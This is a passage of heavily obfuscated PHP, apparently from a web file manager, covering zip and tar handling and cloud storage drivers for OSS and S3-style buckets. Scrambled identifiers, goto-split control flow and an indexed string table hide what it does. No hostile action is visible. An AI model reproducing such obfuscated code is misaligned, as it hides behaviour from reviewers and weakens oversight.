$DÉäÎÖ◊√ë->errorName(!0)); } } } return array($AÉëáë¬íó[1007] => !1, $AÉëáë¬íó[1009] => $AÉëáë¬íó[1834]); goto aΩÒ’ªπﬁÜ; bÆ•ﬁﬂﬁ¶≥: $càí„≈Õ˘ = self::listContent($bãÒØ€ß¶Ç, !1); if (!$càí„≈Õ˘[$AÉëáë¬íó[1007]]) { return $càí„≈Õ˘; } if ($Cüà∂Ï©ñ€ != $AÉëáë¬íó[1006]) { goto Bíïé∏∑˘â; A¶¢†Á‹óù: if ($GLOBALS[$AÉëáë¬íó[6]][$AÉëáë¬íó[1119]] != $AÉëáë¬íó[323]) { $F›Ñÿù•≤˘ = unzip_pre_name($AÁ∏Çà§Êƒ); } $E£óáÌõÙÜ = get_path_father($AÁ∏Çà§Êƒ); if ($E£óáÌõÙÜ == $AÁ∏Çà§Êƒ) { $E£óáÌõÙÜ = $AÉëáë¬íó[33]; } goto E˘ïäπø†°; Bíïé∏∑˘â: $A·”ûÆå∫Ω = self::fileIndex($càí„≈Õ˘[$AÉëáë¬íó[1009]], $Cüà∂Ï©ñ€); $AÁ∏Çà§Êƒ = str_replace(array($AÉëáë¬íó[1047], $AÉëáë¬íó[1830]), $AÉëáë¬íó[71], $A·”ûÆå∫Ω[$AÉëáë¬íó[1828]]); $F›Ñÿù•≤˘ = $AÁ∏Çà§Êƒ; goto A¶¢†Á‹óù; E˘ïäπø†°: if ($A·”ûÆå∫Ω[$AÉëáë¬íó[77]]) { $F›Ñÿù•≤˘ = rtrim($F›Ñÿù•≤˘, $AÉëáë¬íó[8]) . $AÉëáë¬íó[8]; $AÁ∏Çà§Êƒ = array($AÁ∏Çà§Êƒ); } $bˆàÆ¥îÉâ = str_replace($AÉëáë¬íó[96], $AÉëáë¬íó[8], $F›Ñÿù•≤˘); if (substr($bˆàÆ¥îÉâ, -1) == $AÉëáë¬íó[8]) { if (!strstr(trim($bˆàÆ¥îÉâ, $AÉëáë¬íó[8]), $AÉëáë¬íó[8])) { $fÉµ·™∆çÔ = $fÉµ·™∆çÔ . get_path_this($bˆàÆ¥îÉâ) . $AÉëáë¬íó[8]; } } else { if ($E£óáÌõÙÜ == $F›Ñÿù•≤˘) { $E£óáÌõÙÜ = $AÉëáë¬íó[33]; } } goto E˜Ó£œÚÃá; E˜Ó£œÚÃá: } goto bÈ°ô‘ìÃè; aΩÒ’ªπﬁÜ: } static function fileIndex($cëÛﬁπ˘¯≥, $dƒºŒÔÃóÒ, $dÖÈØ¬∫¥‘ = false) { goto dà≠∞ò∆‘Ï; B®àÌÆéÖΩ: $DöÀ’‚òâ· = $aëû¬Ë¡ÌÑ; if ($dÖÈØ¬∫¥‘) { $DöÀ’‚òâ· = $aëû¬Ë¡ÌÑ[$dÖÈØ¬∫¥‘]; if ($aëû¬Ë¡ÌÑ[$c†≥ä—“ˆÂ[77]]) { $DöÀ’‚òâ· = rtrim($DöÀ’‚òâ·, $c†≥ä—“ˆÂ[8]) . $c†≥ä—“ˆÂ[8]; } } return $DöÀ’‚òâ·; goto Cº∑ÔËèﬂ€; dà≠∞ò∆‘Ï: $c†≥ä—“ˆÂ =& $_SERVER[£¿ÌÙëü¡¯¯]; self::init(); if (!is_array($cëÛﬁπ˘¯≥)) { return !1; } goto DØúÈçªƒƒ; DØúÈçªƒƒ: $E¶‘›ÍÈãﬂ = count($cëÛﬁπ˘¯≥); for ($EŒı“Ã›ÿù = 0; $EŒı“Ã›ÿù < $E¶‘›ÍÈãﬂ; $EŒı“Ã›ÿù++) { if ($dƒºŒÔÃóÒ == $cëÛﬁπ˘¯≥[$EŒı“Ã›ÿù][$c†≥ä—“ˆÂ[1011]]) { $aëû¬Ë¡ÌÑ = $cëÛﬁπ˘¯≥[$EŒı“Ã›ÿù]; break; } } if (!$aëû¬Ë¡ÌÑ) { show_tips($c†≥ä—“ˆÂ[1835]); } goto B®àÌÆéÖΩ; Cº∑ÔËèﬂ€: } static function extractZipFile($DŒÇû©°ìô, $F˜ê©´àß≤, $Aì›è◊ÿûû = false) { goto fúƒßÏëêÈ; dÁÇßòÖÜÇ: $E·«ƒÁÈƒî = get_path_father($F˜ê©´àß≤); if ($E·«ƒÁÈƒî == $F˜ê©´àß≤) { $E·«ƒÁÈƒî = $e¡ˆˆÉΩ›é[33]; } $côÌ·∏õØö = $f¢öñöñ⁄Â->extract(PCLZIP_OPT_PATH, $f∏å ÿÎ»ô, PCLZIP_CB_PRE_FILE_NAME, $e¡ˆˆÉΩ›é[1833], PCLZIP_OPT_REMOVE_PATH, $E·«ƒÁÈƒî, PCLZIP_OPT_BY_NAME, $F˜ê©´àß≤); goto e–âëåöªÈ; e–âëåöªÈ: if (!file_exists($e≠æ†äÍπå)) { return !1; } @rename($e≠æ†äÍπå, $A§®⁄ë∂«∂); return $A§®⁄ë∂«∂; goto a≠œ˜ˆÔ–Ñ; fúƒßÏëêÈ: $e¡ˆˆÉΩ›é =& $_SERVER[£¿ÌÙëü¡¯¯]; self::init(); $f∏å ÿÎ»ô = TEMP_FILES . hash_path($DŒÇû©°ìô) . $e¡ˆˆÉΩ›é[8]; goto fÃœ‚Òµ⁄à; fÃœ‚Òµ⁄à: mk_dir($f∏å ÿÎ»ô); $A§®⁄ë∂«∂ = $f∏å ÿÎ»ô . md5($DŒÇû©°ìô . $F˜ê©´àß≤); if ($Aì›è◊ÿûû) { $A§®⁄ë∂«∂ = $f∏å ÿÎ»ô . $Aì›è◊ÿûû; } goto A◊ƒûµÕŸÆ; A◊ƒûµÕŸÆ: if (file_exists($A§®⁄ë∂«∂)) { return $A§®⁄ë∂«∂; } $f¢öñöñ⁄Â = new PclZip($DŒÇû©°ìô); $e≠æ†äÍπå = unzip_filter_ext($f∏å ÿÎ»ô . get_path_this($F˜ê©´àß≤)); goto dÁÇßòÖÜÇ; a≠œ˜ˆÔ–Ñ: } static function filePreview($Dı≠éÂô≥¿, $b≤„õæç€ø, $b‚Ç⁄Ç¿… = false, $CÊ≠öµ‡ºº = false) { goto E∆∏õÕÈû¥; EŒâÓ©ååˆ: $a∫µÏ≥Üﬂƒ = self::extract($Dı≠éÂô≥¿, $C‡Ú˘ÛÉíâ, $b≤„õæç€ø, $Bí—îÛëº≠); if (is_array($Bí—îÛëº≠)) { show_json($eëÖå∆Â ø[1836], !1); } if (file_exists($d∞‡‡ﬂ–¥Ÿ)) { IO::fileOut($d∞‡‡ﬂ–¥Ÿ, $b‚Ç⁄Ç¿…, get_path_this($Bí—îÛëº≠)); return; } goto c¢´ıÓ“€à; AÊ†íŸê≈£: mk_dir($C‡Ú˘ÛÉíâ); $d∞‡‡ﬂ–¥Ÿ = $C‡Ú˘ÛÉíâ . md5($Dı≠éÂô≥¿ . $b≤„õæç€ø . $CÊ≠öµ‡ºº); $Bí—îÛëº≠ = $eëÖå∆Â ø[33]; goto EŒâÓ©ååˆ; B∑„‘îÑ€Ç: if (!file_exists($d∞‡‡ﬂ–¥Ÿ)) { del_dir($C‡Ú˘ÛÉíâ); show_json($eëÖå∆Â ø[1838]); } IO::fileOut($d∞‡‡ﬂ–¥Ÿ, $b‚Ç⁄Ç¿…, $a“œ‰ñı€ë); goto DÖ≠⁄˜ä®ß; Dı©ë”Øåâ: if (!$a∫µÏ≥Üﬂƒ[$eëÖå∆Â ø[1007]]) { show_json($a∫µÏ≥Üﬂƒ[$eëÖå∆Â ø[1009]], !1); } if (!file_exists($b∏ˆ≤Â≠¯’)) { show_json($eëÖå∆Â ø[1837], !1); } @rename($b∏ˆ≤Â≠¯’, $d∞‡‡ﬂ–¥Ÿ); goto B∑„‘îÑ€Ç; E∆∏õÕÈû¥: $eëÖå∆Â ø =& $_SERVER[£¿ÌÙëü¡¯¯]; self::init(); $C‡Ú˘ÛÉíâ = TEMP_FILES . hash_path($Dı≠éÂô≥¿) . $eëÖå∆Â ø[8]; goto AÊ†íŸê≈£; c¢´ıÓ“€à: $Bí—îÛëº≠ = unzip_pre_name($Bí—îÛëº≠); $a“œ‰ñı€ë = get_path_this($Bí—îÛëº≠); $b∏ˆ≤Â≠¯’ = unzip_filter_ext($C‡Ú˘ÛÉíâ . $a“œ‰ñı€ë); goto Dı©ë”Øåâ; DÖ≠⁄˜ä®ß: } static function create($FÓä≤åä˜Ú, $dºÖ»÷Ò€Á) { $eπŸ¥À°¬Ö =& $_SERVER[£¿ÌÙëü¡¯¯]; self::init(); $F∏¶È¿Ö‘» = get_path_ext($FÓä≤åä˜Ú); $d—…üÆ«äë = !1; if (self::checkIfType($F∏¶È¿Ö‘», $eπŸ¥À°¬Ö[298])) { if (kodZipArchive::support($eπŸ¥À°¬Ö[984])) { return kodZipArchive::create($FÓä≤åä˜Ú, $dºÖ»÷Ò€Á); } $e∫Ü¶§–÷ò = new PclZip($FÓä≤åä˜Ú); foreach ($dºÖ»÷Ò€Á as $D¨◊∑ã”≠± => $fä© Ç‡µ„) { $fä© Ç‡µ„ = str_replace($eπŸ¥À°¬Ö[463], $eπŸ¥À°¬Ö[8], $fä© Ç‡µ„); $eΩîÛ¢É…Õ = Kodio::clear(get_path_father($fä© Ç‡µ„)); if ($D¨◊∑ã”≠± == 0) { $d—…üÆ«äë = $e∫Ü¶§–÷ò->create($fä© Ç‡µ„, PCLZIP_OPT_REMOVE_PATH, $eΩîÛ¢É…Õ, PCLZIP_CB_PRE_FILE_NAME, $eπŸ¥À°¬Ö[1839]); continue; } $d—…üÆ«äë = $e∫Ü¶§–÷ò->add($fä© Ç‡µ„, PCLZIP_OPT_REMOVE_PATH, $eΩîÛ¢É…Õ, PCLZIP_CB_PRE_FILE_NAME, $eπŸ¥À°¬Ö[1839]); } } else { if (self::checkIfType($F∏¶È¿Ö‘», $eπŸ¥À°¬Ö[1810])) { foreach ($dºÖ»÷Ò€Á as $D¨◊∑ã”≠± => $fä© Ç‡µ„) { $fä© Ç‡µ„ = str_replace($eπŸ¥À°¬Ö[463], $eπŸ¥À°¬Ö[8], $fä© Ç‡µ„); $eΩîÛ¢É…Õ = Kodio::clear(get_path_father($fä© Ç‡µ„)); if ($D¨◊∑ã”≠± == 0) { $d—…üÆ«äë = PclTarCreate($FÓä≤åä˜Ú, array($fä© Ç‡µ„), $F∏¶È¿Ö‘», null, $eΩîÛ¢É…Õ); continue; } $d—…üÆ«äë = PclTarAddList($FÓä≤åä˜Ú, array($fä© Ç‡µ„), $eπŸ¥À°¬Ö[33], $eΩîÛ¢É…Õ, $F∏¶È¿Ö‘»); } } } return $d—…üÆ«äë; } } goto f™¬íõ≤ßÑ; d≤µÓ®‚Ï≠: class PathDriverNOS extends PathDriverBaseS3 { public $ioUploadServer = "\x31"; public $ioFileOutServer = "\x31"; public function __construct($C§äÌ–Ò¥“) { parent::__construct($C§äÌ–Ò¥“); $this->client->setSignatureVersion($_SERVER[£¿ÌÙëü¡¯¯][197]); } public function setBucketCors() { return !1; } public function getBucketCors() { return !1; } public function isBucketCors() { return !0; } public function setContent($Fëç√√ëÈ’, $eé‡ö∆…‘Ó = '', $BÜ≤ƒ¶ÿƒ∂ = false) { $dœ£∫ûâ¯ú =& $_SERVER[£¿ÌÙëü¡¯¯]; $Fëç√√ëÈ’ = $BÜ≤ƒ¶ÿƒ∂ ? trim($Fëç√√ëÈ’, $dœ£∫ûâ¯ú[8]) . $dœ£∫ûâ¯ú[8] : $Fëç√√ëÈ’; $EÒ≈§◊Â˘Â = get_file_mime(get_path_ext($Fëç√√ëÈ’)); $Aé’∑πåŸ◊ = $this->client->putObject($eé‡ö∆…‘Ó, $this->bucket, $Fëç√√ëÈ’, $dœ£∫ûâ¯ú[182], array(), $EÒ≈§◊Â˘Â); return $Aé’∑πåŸ◊ ? !0 : !1; } public function upload($Fî¿õ≥Ç´œ, $B˜ﬂÒ¯œËó, $D´Ïπ¯‰‹Ú = false, $dËƒ•æÖ£ª = REPEAT_REPLACE) { $DîúªÀ¯ûß =& $_SERVER[£¿ÌÙëü¡¯¯]; $c¥ıƒã⁄Û› = array(); $F¡œ›•ò„Æ = array($DîúªÀ¯ûß[196] => get_file_mime(get_path_ext($Fî¿õ≥Ç´œ))); if (IO::size($B˜ﬂÒ¯œËó) <= 1024 * 1024 * 200) { $aÕÎ∆†––∫ = $this->client->putObjectFile($B˜ﬂÒ¯œËó, $this->bucket, $Fî¿õ≥Ç´œ, $DîúªÀ¯ûß[182], $c¥ıƒã⁄Û›, $F¡œ›•ò„Æ); return !empty($aÕÎ∆†––∫) ? !0 : !1; } $E◊õ›Ëÿ Â = $this->client->multiUploadObject($B˜ﬂÒ¯œËó, $this->bucket, trim($Fî¿õ≥Ç´œ, $DîúªÀ¯ûß[8]), $c¥ıƒã⁄Û›, $F¡œ›•ò„Æ); return $E◊õ›Ëÿ Â ? $this->getPathOuter($Fî¿õ≥Ç´œ) : !1; } public function blockChain($f“Çº·ê¯ , $e»á•ìﬂËÒ) { $f™–äåêó¡ =& $_SERVER[£¿ÌÙëü¡¯¯]; $A¢Î√ãíœé = $this->objectMeta($f“Çº·ê¯ ); if (!$A¢Î√ãíœé) { return !1; } return $this->client->copyObject($this->bucket, $f“Çº·ê¯ , $this->bucket, $f“Çº·ê¯ , $f™–äåêó¡[182], array(), $e»á•ìﬂËÒ, $f™–äåêó¡[1137], !0); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($AäÃ≠‚»∂À) { parent::__construct($AäÃ≠‚»∂À); $this->signatureVersion($_SERVER[£¿ÌÙëü¡¯¯][197]); } public function fileOutLink($B◊íìè≤⁄¥) { $fΩå∫⁄®‡ë =& $_SERVER[£¿ÌÙëü¡¯¯]; if (substr($B◊íìè≤⁄¥, 0, 7) == $fΩå∫⁄®‡ë[1082]) { $B◊íìè≤⁄¥ = $fΩå∫⁄®‡ë[1083] . substr($B◊íìè≤⁄¥, 7); } header($fΩå∫⁄®‡ë[153] . $B◊íìè≤⁄¥); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($Fèıƒ◊ò√ö) { parent::__construct(); include_once SDK_DIR . $_SERVER[£¿ÌÙëü¡¯¯][1138]; $this->_init($Fèıƒ◊ò√ö); } public function _init($CÁ∏Ωë›ì‹) { foreach ($CÁ∏Ωë›ì‹ as $C◊œ‰Úô…ﬂ => $a‚ﬁÉê·öû) { if (isset($this->{$C◊œ‰Úô…ﬂ})) { $this->{$C◊œ‰Úô…ﬂ} = $a‚ﬁÉê·öû; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[£¿ÌÙëü¡¯¯][1139], !1); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); } public function setBucketCors() { goto a ™‚™ã√√; a ™‚™ã√√: $bªæÖª¡ô˘ =& $_SERVER[£¿ÌÙëü¡¯¯]; $D„ÎÜ¨ﬁæ¬ = new OSS\Model\CorsConfig(); $DÆΩ⁄€öÀÜ = new OSS\Model\CorsRule(); goto DñâÊçß•Ó; BÂÏ»¥¶Ú: $DÆΩ⁄€öÀÜ->setMaxAgeSeconds(600); $DÆΩ⁄€öÀÜ->addExposeHeader($bªæÖª¡ô˘[1145]); $DÆΩ⁄€öÀÜ->addAllowedHeader($bªæÖª¡ô˘[1140]); goto F“⁄§ù¿Óè; F“⁄§ù¿Óè: $D„ÎÜ¨ﬁæ¬->addRule($DÆΩ⁄€öÀÜ); try { $this->client->putBucketCors($this->bucket, $D„ÎÜ¨ﬁæ¬); } catch (OSS\Core\OssException $aÒç•ﬁŸ•¢) { return !1; } return !0; goto EÆÌã ÚãÖ; eÙÆÂÁõ÷¡: $DÆΩ⁄€öÀÜ->addAllowedMethod($bªæÖª¡ô˘[1143]); $DÆΩ⁄€öÀÜ->addAllowedMethod($bªæÖª¡ô˘[1144]); $DÆΩ⁄€öÀÜ->addAllowedMethod($bªæÖª¡ô˘[152]); goto BÂÏ»¥¶Ú; DñâÊçß•Ó: $DÆΩ⁄€öÀÜ->addAllowedOrigin($bªæÖª¡ô˘[1140]); $DÆΩ⁄€öÀÜ->addAllowedMethod($bªæÖª¡ô˘[1141]); $DÆΩ⁄€öÀÜ->addAllowedMethod($bªæÖª¡ô˘[1142]); goto eÙÆÂÁõ÷¡; EÆÌã ÚãÖ: } public function getBucketCors() { goto eîÇ∫é∞àÿ; DÜàœ”íñÓ: $C¯åà◊◊…’ = $c§ºãÀ£ôò[0]->getMaxAgeSeconds(); $aõ¥™è†êÏ = $c§ºãÀ£ôò[0]->getExposeHeaders(); $cÒæä∞¬£¥ = $c§ºãÀ£ôò[0]->getAllowedHeaders(); goto BëïŸî∞€´; BëïŸî∞€´: return array($DŒπÀ≈›ı’[172] => isset($e∑” Ü±˘Æ[0]) ? $e∑” Ü±˘Æ[0] : $DŒπÀ≈›ı’[33], $DŒπÀ≈›ı’[176] => $fÒîè¡‡ú¯, $DŒπÀ≈›ı’[1146] => $C¯åà◊◊…’, $DŒπÀ≈›ı’[1147] => isset($aõ¥™è†êÏ[0]) ? $aõ¥™è†êÏ[0] : $DŒπÀ≈›ı’[33], $DŒπÀ≈›ı’[174] => isset($cÒæä∞¬£¥[0]) ? $cÒæä∞¬£¥[0] : $DŒπÀ≈›ı’[33]); goto aå∂≈ÁÖˆ∞; eîÇ∫é∞àÿ: $DŒπÀ≈›ı’ =& $_SERVER[£¿ÌÙëü¡¯¯]; $a©ﬁß„©ÀÎ = null; try { $a©ﬁß„©ÀÎ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $d≈∆ﬂÀû…∑) { return null; } goto DäÕ™°Îµ”; DäÕ™°Îµ”: if (!$a©ﬁß„©ÀÎ || !($c§ºãÀ£ôò = $a©ﬁß„©ÀÎ->getRules())) { return null; } $e∑” Ü±˘Æ = $c§ºãÀ£ôò[0]->getAllowedOrigins(); $fÒîè¡‡ú¯ = $c§ºãÀ£ôò[0]->getAllowedMethods(); goto DÜàœ”íñÓ; aå∂≈ÁÖˆ∞: } public function isBucketCors() { goto A¨ú»ÜÒò‰; A¨ú»ÜÒò‰: $A÷∞—“µæÔ =& $_SERVER[£¿ÌÙëü¡¯¯]; $B›¶»Û¬ó  = $this->getBucketCors(); if (!$B›¶»Û¬ó  || !is_array($B›¶»Û¬ó )) { return !1; } goto a‚Éàö‘—∫; Eç¯√¿´Ñé: $bŒº´¡›äê = array($A÷∞—“µæÔ[177], $A÷∞—“µæÔ[178], $A÷∞—“µæÔ[179], $A÷∞—“µæÔ[180], $A÷∞—“µæÔ[181]); $fÉ®Û‚Ò»ÿ = array_diff($bŒº´¡›äê, $Bæìá—ﬂ˘ç); return empty($fÉ®Û‚Ò»ÿ); goto bíÙ˘ƒê‡Ù; a‚Éàö‘—∫: if ($B›¶»Û¬ó [$A÷∞—“µæÔ[172]] != $A÷∞—“µæÔ[173] || $B›¶»Û¬ó [$A÷∞—“µæÔ[174]] != $A÷∞—“µæÔ[173]) { return !1; } $Bæìá—ﬂ˘ç = array_map($A÷∞—“µæÔ[175], $B›¶»Û¬ó [$A÷∞—“µæÔ[176]]); if (!is_array($Bæìá—ﬂ˘ç)) { $Bæìá—ﬂ˘ç = array(); } goto Eç¯√¿´Ñé; bíÙ˘ƒê‡Ù: } public function mkfile($dó€æ’‹πÚ, $CﬁÓ∫ﬂåÑÛ = '', $EÊèı⁄´Ã¿ = REPEAT_RENAME) { $eÓ∂ö€Óòõ = $this->setContent($dó€æ’‹πÚ, $CﬁÓ∫ﬂåÑÛ); if ($eÓ∂ö€Óòõ !== !1) { return $this->getPathOuter($dó€æ’‹πÚ); } return !1; } public function mkdir($f±Áí◊ÇáÜ, $EÎ›…Ÿ∑ñ = REPEAT_SKIP) { if ($this->_isFolder($f±Áí◊ÇáÜ)) { return $this->getPathOuter($f±Áí◊ÇáÜ); } try { $this->client->createObjectDir($this->bucket, $f±Áí◊ÇáÜ); } catch (OSS\Core\OssException $Aåò«âèò”) { return !1; } return $this->getPathOuter($f±Áí◊ÇáÜ); } private function fileList($bªÚ™¢ÑæÉ, $dÈß◊ÕöÎ¥ = '', $E±‚¿…“ÊÒ = 0) { goto b˘…ÔÊ¶É; b˘…ÔÊ¶É: $BÜ™¿µÉ∞Ì =& $_SERVER[£¿ÌÙëü¡¯¯]; $bªÚ™¢ÑæÉ = trim($bªÚ™¢ÑæÉ, $BÜ™¿µÉ∞Ì[8]); $eçáÕáÖóª = empty($bªÚ™¢ÑæÉ) ? $BÜ™¿µÉ∞Ì[33] : $bªÚ™¢ÑæÉ . $BÜ™¿µÉ∞Ì[8]; goto B∂•∫¬áõÑ; D„üÏèë’Í: while (!0) { $F¯ÕÍü÷¢î = array($BÜ™¿µÉ∞Ì[1148] => $dÈß◊ÕöÎ¥, $BÜ™¿µÉ∞Ì[183] => $eçáÕáÖóª, $BÜ™¿µÉ∞Ì[1149] => $cÃËìûŸò◊, $BÜ™¿µÉ∞Ì[1150] => $CÌ¥◊ôƒ∆); try { $Côº€ÈË≥à = $this->client->listObjects($this->bucket, $F¯ÕÍü÷¢î); } catch (OSS\Core\OssException $C¡À⁄Ñÿ“Æ) { break; } $CÌ¥◊ôƒ∆ = $Côº€ÈË≥à->getNextMarker(); $d·ŒÀ€ÇÛ = $Côº€ÈË≥à->getObjectList(); $D±ù¢˜éíÜ = $Côº€ÈË≥à->getPrefixList(); foreach ($d·ŒÀ€ÇÛ as $dÚ⁄„ÔÔÜ˘) { if ($dÚ⁄„ÔÔÜ˘->getKey() == $eçáÕáÖóª) { continue; } $FÉÁãŸµ∑… = $dÚ⁄„ÔÔÜ˘->getKey(); if ($E±‚¿…“ÊÒ) { $FÉÁãŸµ∑… = array($BÜ™¿µÉ∞Ì[28] => $FÉÁãŸµ∑…, $BÜ™¿µÉ∞Ì[78] => $dÚ⁄„ÔÔÜ˘->getSize(), $BÜ™¿µÉ∞Ì[187] => strtotime($dÚ⁄„ÔÔÜ˘->getLastModified())); } $E∆≈°±†”ô[] = $FÉÁãŸµ∑…; } foreach ($D±ù¢˜éíÜ as $eº£Ú‹·Éß) { $EﬁØ∂©ÎŸ˘[] = $eº£Ú‹·Éß->getPrefix(); } if ($CÌ¥◊ôƒ∆ === $BÜ™¿µÉ∞Ì[33]) { break; } } return array($BÜ™¿µÉ∞Ì[75] => $EﬁØ∂©ÎŸ˘, $BÜ™¿µÉ∞Ì[74] => $E∆≈°±†”ô); goto dÑ√ßŸ‘¯ò; B∂•∫¬áõÑ: $CÌ¥◊ôƒ∆ = $BÜ™¿µÉ∞Ì[33]; $cÃËìûŸò◊ = 1000; $EﬁØ∂©ÎŸ˘ = $E∆≈°±†”ô = array(); goto D„üÏèë’Í; dÑ√ßŸ‘¯ò: } public function copyFile($E≈◊í°´îï, $Cä“±ÊÉÖÜ) { $E¶«–úêöî = $this->size($E≈◊í°´îï); if ($E¶«–úêöî < 1024 * 1024 * 1024) { try { $C≥Ã⁄˘Î∞ä = $this->client->copyObject($this->bucket, $E≈◊í°´îï, $this->bucket, $Cä“±ÊÉÖÜ); } catch (OSS\Core\OssException $B⁄Óôãøí†) { return !1; } return !0; } return $this->multiCopyObject($E≈◊í°´îï, $Cä“±ÊÉÖÜ, $E¶«–úêöî); } private function multiCopyObject($aÑ¥ÁåŒêØ, $e‘ÖåÔèÙì, $a†Œê˜ßùø) { $Eﬂ¯˘ÿ÷™ç =& $_SERVER[£¿ÌÙëü¡¯¯]; try { goto C¶úø•ãÁ ; C¶úø•ãÁ : $FõÀâÚå“® = array(); if ($AéÎ£ñàÁø = $this->hashMd5($aÑ¥ÁåŒêØ)) { $FõÀâÚå“® = array(OSS\OssClient::OSS_HEADERS => array($Eﬂ¯˘ÿ÷™ç[1151] => $AéÎ£ñàÁø)); } $fâΩ∫÷¥ªú = $this->client->initiateMultipartUpload($this->bucket, $e‘ÖåÔèÙì, $FõÀâÚå“®); goto FƒÃù∆¨ÚÑ; A†…ëÏ∞Ö”: $f•Ã…äπçÕ = $this->osChunkSize(); $dàÎâˆ©íß = $this->client->generateMultiuploadParts($a†Œê˜ßùø, $f•Ã…äπçÕ); foreach ($dàÎâˆ©íß as $E⁄õ∫í……⁄ => $DëÖ≈¿›®ª) { $Càƒ◊≤ê»… = $f˜ÃúÃˆ—⁄ + (int) $DëÖ≈¿›®ª[$Eﬂ¯˘ÿ÷™ç[1152]]; $Bæ”’µ≠î£ = (int) $DëÖ≈¿›®ª[$Eﬂ¯˘ÿ÷™ç[322]] + $Càƒ◊≤ê»… - 1; $E˜«çáôùÍ = array($Eﬂ¯˘ÿ÷™ç[1153] => $Càƒ◊≤ê»…, $Eﬂ¯˘ÿ÷™ç[1154] => $Bæ”’µ≠î£); $f”ª•±≈ÏÒ[] = $this->client->uploadPartCopy($this->bucket, $aÑ¥ÁåŒêØ, $this->bucket, $e‘ÖåÔèÙì, $b£•Ãáàß, $fâΩ∫÷¥ªú, $E˜«çáôùÍ); $b£•Ãáàß = $b£•Ãáàß + 1; } goto eÊ≥Ω Íëç; eÊ≥Ω Íëç: $bπ¡œ·Ü∂„ = array(); foreach ($f”ª•±≈ÏÒ as $E⁄õ∫í……⁄ => $DƒáÎÿ®Ñ‹) { $bπ¡œ·Ü∂„[] = array($Eﬂ¯˘ÿ÷™ç[1155] => $E⁄õ∫í……⁄ + 1, $Eﬂ¯˘ÿ÷™ç[1156] => $DƒáÎÿ®Ñ‹); } $fÉ¶ñÿáîÏ = $this->client->completeMultipartUpload($this->bucket, $e‘ÖåÔèÙì, $fâΩ∫÷¥ªú, $bπ¡œ·Ü∂„); goto CØÙöºÈ˜©; FƒÃù∆¨ÚÑ: $b£•Ãáàß = 1; $f˜ÃúÃˆ—⁄ = 0; $f”ª•±≈ÏÒ = array(); goto A†…ëÏ∞Ö”; CØÙöºÈ˜©: } catch (OSS\Core\OssException $cΩéô»ﬁßà) { return !1; } return !0; } public function moveFile($aÀáì‘⁄˜¢, $A´œö¯›í„) { if ($this->copyFile($aÀáì‘⁄˜¢, $A´œö¯›í„)) { $this->remove($aÀáì‘⁄˜¢); return !0; } return !1; } public function delFile($CÈåóπªﬁ›) { try { $this->client->deleteObject($this->bucket, $CÈåóπªﬁ›); } catch (OSS\Core\OssException $E„Ω≠ùÇﬁ∞) { return !1; } return !0; } public function delFolder($Béõµ¥ﬁüŸ) { $C«ÒñÔ—ãï =& $_SERVER[£¿ÌÙëü¡¯¯]; $eÿ¨ÚÙâ∏â = $this->fileList($Béõµ¥ﬁüŸ); if (!empty($Béõµ¥ﬁüŸ) && !in_array(trim($Béõµ¥ﬁüŸ, $C«ÒñÔ—ãï[8]) . $C«ÒñÔ—ãï[8], $eÿ¨ÚÙâ∏â[$C«ÒñÔ—ãï[74]])) { $eÿ¨ÚÙâ∏â[$C«ÒñÔ—ãï[74]][] = trim($Béõµ¥ﬁüŸ, $C«ÒñÔ—ãï[8]) . $C«ÒñÔ—ãï[8]; } foreach (array_chunk($eÿ¨ÚÙâ∏â[$C«ÒñÔ—ãï[74]], 1000) as $FÁ≥ıÙÒ◊â) { try { $this->client->deleteObjects($this->bucket, $FÁ≥ıÙÒ◊â); } catch (OSS\Core\OssException $eÌÇö∑‰∏) { continue; } } return !0; } public function rename($a£áÜπ‚’ë, $eñÿìåŸ∏Ø) { return $this->renameObject($a£áÜπ‚’ë, $eñÿìåŸ∏Ø); } private function fileInfo($e’í“áµ≈≠, $e¡ÙÂ™√†á = array()) { goto d‰Àœ˜”Êô; d‰Àœ˜”Êô: $DáÕÆ≤ ùÿ =& $_SERVER[£¿ÌÙëü¡¯¯]; $c‹´ùé√§æ = array($DáÕÆ≤ ùÿ[28] => $this->pathThis($e’í“áµ≈≠), $DáÕÆ≤ ùÿ[76] => $this->getPathOuter($e’í“áµ≈≠), $DáÕÆ≤ ùÿ[29] => $DáÕÆ≤ ùÿ[164], $DáÕÆ≤ ùÿ[184] => 0, $DáÕÆ≤ ùÿ[108] => 0, $DáÕÆ≤ ùÿ[78] => 0, $DáÕÆ≤ ùÿ[157] => $this->ext($e’í“áµ≈≠), $DáÕÆ≤ ùÿ[185] => !0, $DáÕÆ≤ ùÿ[186] => !0); if (empty($e¡ÙÂ™√†á)) { $eÜÖ◊œº«≤ = $this->objectMeta($e’í“áµ≈≠); if (!$eÜÖ◊œº«≤) { return $c‹´ùé√§æ; } $e¡ÙÂ™√†á = array($DáÕÆ≤ ùÿ[108] => strtotime($eÜÖ◊œº«≤[$DáÕÆ≤ ùÿ[1157]]), $DáÕÆ≤ ùÿ[78] => $eÜÖ◊œº«≤[$DáÕÆ≤ ùÿ[1158]] + 0); } goto EŒæÕ≈Ãùâ; Aíﬂ™ êﬁ˜: return $c‹´ùé√§æ; goto EìØ—ÊËﬁë; EŒæÕ≈Ãùâ: if (isset($e¡ÙÂ™√†á[$DáÕÆ≤ ùÿ[78]])) { $c‹´ùé√§æ[$DáÕÆ≤ ùÿ[78]] = $e¡ÙÂ™√†á[$DáÕÆ≤ ùÿ[78]]; } if (isset($e¡ÙÂ™√†á[$DáÕÆ≤ ùÿ[108]])) { $c‹´ùé√§æ[$DáÕÆ≤ ùÿ[108]] = $e¡ÙÂ™√†á[$DáÕÆ≤ ùÿ[108]]; } if (isset($e¡ÙÂ™√†á[$DáÕÆ≤ ùÿ[187]]) && !trim($c‹´ùé√§æ[$DáÕÆ≤ ùÿ[108]])) { $c‹´ùé√§æ[$DáÕÆ≤ ùÿ[108]] = $e¡ÙÂ™√†á[$DáÕÆ≤ ùÿ[187]]; } goto Aíﬂ™ êﬁ˜; EìØ—ÊËﬁë: } private function folderInfo($BÓ∑‘÷Ñ‘Ö, $B¨ÎŸÙáäÆ = array()) { 